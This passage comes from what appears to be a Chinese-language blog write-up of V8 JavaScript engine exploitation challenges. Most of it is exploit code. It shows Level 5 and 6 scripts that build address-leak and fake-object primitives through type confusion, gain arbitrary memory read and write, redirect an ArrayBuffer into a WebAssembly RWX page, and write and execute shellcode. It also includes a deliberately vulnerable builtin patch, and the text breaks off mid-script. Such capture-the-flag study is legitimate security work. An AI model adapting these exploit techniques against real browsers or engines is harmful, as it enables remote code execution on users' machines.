obj_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj_arr_map_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Prototype for obj_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj_arr_prototype.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Map addr for float_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(float_arr_map_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Prototype for float_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(float_arr_prototype.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(trojan_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(float_arr);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get32addr</span>(<span class="params">object</span>)&#123;</span><br><span class="line">	obj_arr[<span class="number">0</span>] = object;</span><br><span class="line">	trojan_arr[<span class="number">0x1d</span>] = <span class="title function_">u2f</span>(before_obj_arr_map_addr, float_arr_map_addr+<span class="number">1</span>);</span><br><span class="line">	trojan_arr[<span class="number">0x1e</span>] = <span class="title function_">u2f</span>(float_arr_prototype, after_obj_arr_prototype);</span><br><span class="line">	addr = obj_arr[<span class="number">0</span>];</span><br><span class="line">	obj_arr[<span class="number">0</span>] = sample_obj;</span><br><span class="line">        trojan_arr[<span class="number">0x1d</span>] = <span class="title function_">u2f</span>(before_obj_arr_map_addr, obj_arr_map_addr+<span class="number">1</span>);</span><br><span class="line">        trojan_arr[<span class="number">0x1e</span>] = <span class="title function_">u2f</span>(obj_arr_prototype, after_obj_arr_prototype);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2ul</span>(addr)-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getfakeobject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	float_arr[<span class="number">0</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, obj_arr_map_addr+<span class="number">1</span>);</span><br><span class="line">	trojan_arr[<span class="number">0x24</span>] = <span class="title function_">u2f</span>(obj_arr_map_addr+<span class="number">1</span>, obj_arr_prototype);</span><br><span class="line">	cur_fake_obj = float_arr[<span class="number">0</span>];</span><br><span class="line">	float_arr[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">	trojan_arr[<span class="number">0x24</span>] = <span class="title function_">u2f</span>(float_arr_map_addr+<span class="number">1</span>, float_arr_prototype);</span><br><span class="line">	<span class="keyword">return</span> cur_fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get32addr</span>(a).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line">new_a = <span class="title function_">getfakeobject</span>(<span class="title function_">get32addr</span>(a));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(new_a);</span><br><span class="line">new_a[<span class="number">2</span>]=<span class="number">13.37</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = [<span class="title function_">i2f</span>(<span class="number">0x31040404001c01b5n</span>), <span class="title function_">i2f</span>(<span class="number">0x0a0007ff11000844n</span>)]; <span class="comment">//fake a map: 0x31040404001c01b5	0x0a0007ff11000844</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ELEMENT_OFFSET</span> = <span class="number">0x18</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">MAP_OFFSET</span> = <span class="number">0x54</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WASM_PAGE_SIZE</span> = <span class="number">0x28090</span>;</span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//while(1);</span></span><br><span class="line">arr_element_addr = <span class="title function_">get32addr</span>(arr)-<span class="variable constant_">ELEMENT_OFFSET</span>; <span class="comment">//element</span></span><br><span class="line">fake_map_addr = <span class="title function_">get32addr</span>(fake)+<span class="variable constant_">MAP_OFFSET</span>; <span class="comment">//map</span></span><br><span class="line">fake_array = [<span class="title function_">u2f</span>(fake_map_addr+<span class="number">1</span>, <span class="number">750</span>), <span class="title function_">u2f</span>(arr_element_addr+<span class="number">1</span>, <span class="number">100</span>)]; <span class="comment">//map, properties, elements, len</span></span><br><span class="line">fake_obj = <span class="title function_">getfakeobject</span>(<span class="title function_">get32addr</span>(fake_array)+<span class="variable constant_">MAP_OFFSET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbRead64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	addr -= <span class="number">0x10</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbWrite64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">	addr -= <span class="number">0x10</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	fake_obj[<span class="number">0</span>] = <span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(arr_element_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title class_">ArbWrite64</span>(arr_element_addr, <span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(arr_element_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="title function_">i2f</span>(<span class="number">0x9090909090909090n</span>),<span class="title function_">i2f</span>(<span class="number">0x2434810101666068n</span>),<span class="title function_">i2f</span>(<span class="number">0x6567b84801010101n</span>),<span class="title function_">i2f</span>(<span class="number">0x48506c667461632fn</span>),<span class="title function_">i2f</span>(<span class="number">0x656c6c6168632fb8n</span>),<span class="title function_">i2f</span>(<span class="number">0x31d231e78948506en</span>),<span class="title function_">i2f</span>(<span class="number">0x0000050f583b6af6n</span>)];</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title class_">ArbRead64</span>(<span class="title function_">get32addr</span>(wasm_instance)+<span class="variable constant_">WASM_PAGE_SIZE</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] WASM Instance ADDR:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get32addr</span>(wasm_instance).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//console.log(GetAddressOf(fake).toString(16));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(arr).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// move dataview to RWX memory</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] BUF ADDR:&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title function_">get32addr</span>(buf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> backing_store_pointer = buf_addr + <span class="number">0x2c</span>;</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line">backing_store_addr = <span class="title class_">ArbRead64</span>(backing_store_pointer);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="number">8</span>*i).<span class="title function_">toString</span>(<span class="number">16</span>)+<span class="string">&#x27;:&#x27;</span>+<span class="title class_">ArbRead64</span>(buf_addr+i*<span class="number">0x8</span>).<span class="title function_">toString</span>(<span class="number">16</span>));&#125;</span><br><span class="line"><span class="comment">//caculate full rwx addr</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] RWX PAGE ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_page_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(backing_store_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//ArbWrite64(backing_store_pointer, backing_store_addr);</span></span><br><span class="line"><span class="title class_">ArbWrite64</span>(backing_store_pointer,rwx_page_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(backing_store_pointer).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_obj);</span></span><br><span class="line"><span class="comment">// copy shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jump to RWX memory</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p>給了一個 Array prototype 的 function，接著可以塞另一個 function 進去做 input 跟 output，input 是 array 裡面的值並且最後對應值會被換成 output。<br><strong>patch</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">UILTIN(ArrayFunctionMap) &#123;</span><br><span class="line">+	HandleScope <span class="title function_">scope</span><span class="params">(isolate)</span>;</span><br><span class="line">+	Factory *factory = isolate-&gt;factory();</span><br><span class="line">+	Handle&lt;Object&gt; receiver = args.receiver();</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">if</span> (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) &#123;</span><br><span class="line">+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    	factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Nope&quot;</span>)));</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line">+	Handle&lt;JSArray&gt; <span class="built_in">array</span> = Cast&lt;JSArray&gt;(receiver);</span><br><span class="line">+</span><br><span class="line">+	ElementsKind kind = <span class="built_in">array</span>-&gt;GetElementsKind();</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">if</span> (kind != PACKED_DOUBLE_ELEMENTS) &#123;</span><br><span class="line">+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    	factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Need an array of double numbers&quot;</span>)));</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">if</span> (args.length() != <span class="number">2</span>) &#123;</span><br><span class="line">+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    	factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Need exactly one argument&quot;</span>)));</span><br><span class="line">+	&#125;</span><br><span class="line">+	</span><br><span class="line">+	<span class="type">uint32_t</span> len = static_cast&lt;<span class="type">uint32_t</span>&gt;(Object::NumberValue(<span class="built_in">array</span>-&gt;length()));</span><br><span class="line">+</span><br><span class="line">+	Handle&lt;Object&gt; func_obj = args.at(<span class="number">1</span>);</span><br><span class="line">+	<span class="keyword">if</span> (!IsJSFunction(*func_obj)) &#123;</span><br><span class="line">+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    	factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;The argument must be a function&quot;</span>)));</span><br><span class="line">+	&#125;</span><br><span class="line">+	</span><br><span class="line">+	<span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">+		<span class="type">double</span> elem = Cast&lt;FixedDoubleArray&gt;(<span class="built_in">array</span>-&gt;elements())-&gt;get_scalar(i);</span><br><span class="line">+		Handle&lt;Object&gt; elem_handle = factory-&gt;NewHeapNumber(elem);</span><br><span class="line">+		Handle&lt;Object&gt; result = Execution::Call(isolate, func_obj, <span class="built_in">array</span>, <span class="number">1</span>, &amp;elem_handle).ToHandleChecked();</span><br><span class="line">+		<span class="keyword">if</span> (!IsNumber(*result)) &#123;</span><br><span class="line">+		  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    		factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;The function must return a number&quot;</span>)));</span><br><span class="line">+		&#125;</span><br><span class="line">+		<span class="type">double</span> result_value = static_cast&lt;<span class="type">double</span>&gt;(Object::NumberValue(*result));</span><br><span class="line">+		Cast&lt;FixedDoubleArray&gt;(<span class="built_in">array</span>-&gt;elements())-&gt;<span class="built_in">set</span>(i, result_value);</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先，他會先確認呼叫它的是個 array，然後去確認裡面都是 double，接著就進去 for loop 做操作。<br>請注意，這邊不會在執行過程中再檢查一遍，所以感覺其實有點 race condition 或者 ReEntrancy Attack ？<br>反正就是可以偷偷把它換成 object array，他卻依然把它做為一個 double array 的 layout 判斷，就成功拿到一個 type confusion，最後重新算一下對應的 offset 就可以戳出物件記憶體位置 ＆ 透過抽換對應的位置變成地址來 FakeObject（因為這時候就被當成 object array 對待了）。<br>最後就跟前面的操作一樣了w  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2ul</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2uh</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">last32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    dv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get32addr</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> flex_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> addr = <span class="title class_">NaN</span>;</span><br><span class="line">    flex_arr.<span class="title function_">functionMap</span>(<span class="function"><span class="params">x</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (idx == <span class="number">0</span>)&#123;</span><br><span class="line">            idx ++;</span><br><span class="line">            flex_arr[<span class="number">2</span>] = obj;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(idx == <span class="number">1</span>)&#123;</span><br><span class="line">            idx ++;</span><br><span class="line">            addr = x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2ul</span>(addr)-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getfakeobject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> flex_addr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> obj = &#123;<span class="string">&quot;meow&quot;</span>:<span class="string">&quot;whale&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="number">0</span>;</span><br><span class="line">    flex_addr.<span class="title function_">functionMap</span>(<span class="function"><span class="params">x</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(idx == <span class="number">0</span>)&#123;</span><br><span class="line">            idx ++;</span><br><span class="line">            <span class="comment">//flex_addr[0] = u2f(addr, 0);</span></span><br><span class="line">            flex_addr[<span class="number">2</span>] = obj;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> x;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> flex_addr[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get32addr</span>(a).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">b = <span class="title function_">getfakeobject</span>(<span class="title function_">get32addr</span>(a))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">b[<span class="number">1</span>] = <span class="number">13.37</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = [<span class="title function_">i2f</span>(<span class="number">0x31040404001c01b5n</span>), <span class="title function_">i2f</span>(<span class="number">0x0a0007ff11000844n</span>)]; <span class="comment">//fake a map: 0x31040404001c01b5	0x0a0007ff11000844</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ELEMENT_OFFSET</span> = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">MAP_OFFSET</span> = <span class="number">0x24</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WASM_PAGE_SIZE</span> = <span class="number">0x2bf34</span>;</span><br><span class="line"></span><br><span 